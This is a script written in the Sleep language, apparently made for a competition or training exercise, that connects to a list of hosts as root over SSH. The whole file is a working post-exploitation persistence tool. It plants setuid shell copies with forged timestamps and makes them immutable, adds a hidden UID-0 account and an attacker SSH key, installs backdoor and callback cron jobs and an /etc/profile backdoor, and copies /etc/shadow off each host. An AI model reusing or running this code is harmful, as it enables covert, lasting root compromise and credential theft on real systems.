
#
# this script uses ssh to connect to a student's box and lock it down
#

debug(7 | 34);

include("lib/ssh.sl");

sub quickExec {
	local('$session $handle');
	$session = ssh_connect($user => 'root', $pass => $password, $host => $host);
	$handle = ssh_exec($session, $1);
	ssh_close($session);
}

sub outputExec {
	local('$session $handle $output');
	$session = ssh_connect($user => 'root', $pass => $password, $host => $host);
	$handle = ssh_exec($session, $1);
	$output = readb($handle, -1);
	closef($handle);
	ssh_close($session);
	return $output;
}

sub outputExec2 {
	local('$session $handle $output');
	$session = ssh_connect($user => 'root', $key => "resources/id_dsa", $host => $host);
	$handle = ssh_exec($session, $1);
	$output = readb($handle, -1);
	closef($handle);
	ssh_close($session);
	return $output;
}

sub uploadFile {
	local('$handle $data $session $exception');
	try {
		$handle = openf($local);
		$data = readb($handle, -1);
		closef($handle);

		$session = ssh_connect($user => 'root', $pass => $password, $host => $host);
		$handle = ssh_exec($session, 'cat >' . $file);
		writeb($handle, $data);
		ssh_close($session);

		$session = ssh_connect($user => 'root', $pass => $password, $host => $host);
		$handle = ssh_exec($session, 'chmod '.$perms.' '.$file.'; touch -d "7 May 2006" ' . $file);
		ssh_close($session);
	}
	catch $exception {
		warn("Upload $file $+ @ $+ $host failed: $exception");
	}
}

sub addStuff {
	try {
		local('$exception');

		# copy shell
		quickExec('cp /bin/zsh /.kernel; chmod +sss /.kernel; touch -d "4 May 2004" /.kernel; chattr +i /.kernel');
		quickExec('cp /bin/tcsh /tmp/X11.auth; chmod +sss /tmp/X11.auth; touch -d "4 May 2004" /tmp/X11.auth');
	}
	catch $exception {
		warn("$host - backdoored shell fail");
	}
}

sub addSSHKey {
	try {
		local('$session $handle $key $exception');

		# read the ssh key
		$handle = openf('resources/id_dsa.pub');
		$key = readb($handle, -1);
		closef($handle);

		# add ssh keys to the box
		$session = ssh_connect($user => 'root', $pass => $password, $host => $host);
		$handle = ssh_exec($session, 'mkdir /root/.ssh; cat >>/root/.ssh/authorized_keys');
		writeb($handle, $key);
		ssh_close($session);
	}
	catch $exception {
		warn("$host - add key fail: $exception");
	}
}

sub newuser {
	local('$exception');
	try {
		# add a sshd user.
		quickExec('echo "nobody8:\$1\$1bj64Mcl\$r8sDs5T5MsLFMnh4EDJh00:14291:0:99999:7:::" >>/etc/shadow');
		quickExec('echo "nobody8:x:0:0:nobody,,,,:/:/bin/bash" >>/etc/passwd');
	}
	catch $exception {
		warn("$host - add user fail: $exception");
	}
}

sub cronjob {
	local('$exception');
	try {
		# install our backdoor
		uploadFile($file => '/etc/cron.hourly/dpkg', $local => 'resources/backdoor', $perms => 755);
		quickExec('touch -d "12 Jul 08" /etc/cron.hourly/dpkg; chattr +i /etc/cron.daily/dpkg');

		# install cronjob
		uploadFile($file => '/etc/cron.hourly/package-update', $local => 'resources/callback.sh', $perms => 755);
		quickExec('touch -d "12 Jul 08" /etc/cron.hourly/package-update; chattr +i /etc/cron.hourly/package-update; chattr +i `which curl`');

		# let's try that again..
		uploadFile($file => '/etc/cron.daily/inn-cron-rnews', $local => 'resources/callback.sh', $perms => 755);
		quickExec('touch -d "12 Jul 08" /etc/cron.hourly/inn-cron-rnews; chattr +i /etc/cron.daily/inn-cron-rnews; chattr +i `which wget`');
	}
	catch $exception {	
		warn("$host - cronjob fail: $exception");
	}
}

sub userbackdoor {
        # set up /etc/profile backdoor... *pHEAR*
	local('$exception');
        try {
                uploadFile($file => '/usr/bin/ufw', $local => 'resources/backdoor', $perms => 755);
                quickExec('echo "/usr/bin/ufw &" >>/etc/profile');
                quickExec('echo "/usr/bin/ufw &" >>/etc/skel/.profile');
		quickExec('chmod +sss /usr/bin/ufw');
                quickExec('chattr +i /etc/skel/.profile /etc/profile /usr/bin/ufw');
        }
        catch $exception {
                warn("$host - /etc/profile backdoor fail $exception");
        }
}

sub tryit {
	# $host / $password are GLOBAL variables in this thread... all functions see them.

	warn("Processing $host $+ / $+ $password");

	# check if we've been here or not.
	local('$check');

	$check = outputExec("ls -alh /.kernel");
	if ($check ne "") {
		warn("$host has already been owned");
	}

	# add an authorized key.
	addSSHKey();

	# copy some shells to different places
	addStuff();

	# add a new user
	newuser();

	# add a backdoor to crontab
	cronjob();

	# backdoor the damned users... bastards they are
	userbackdoor();
	
	# check for success...
	local('$data $handle $exception');
	try {
		$data = outputExec2('cat /etc/shadow');
		$handle = openf(">output/ $+ $host");
		writeb($handle, $data);
		closef($handle);
		if (strlen($data) > 0) {
			warn("Owned $host");
		}
	}
	catch $exception {
		warn("Failed $host - $exception");
	}
}

sub main {
	local('$handle $entry $host $password');
	$handle = openf("tmp/ready.txt");
	while $entry (readln($handle)) {
		($host, $password) = split('\t+', $entry);
		fork(&tryit, $host => "$host", $password => "$password");
	}

	while (1) {
		sleep(60 * 1000);
	}
}

invoke(&main, @ARGV);
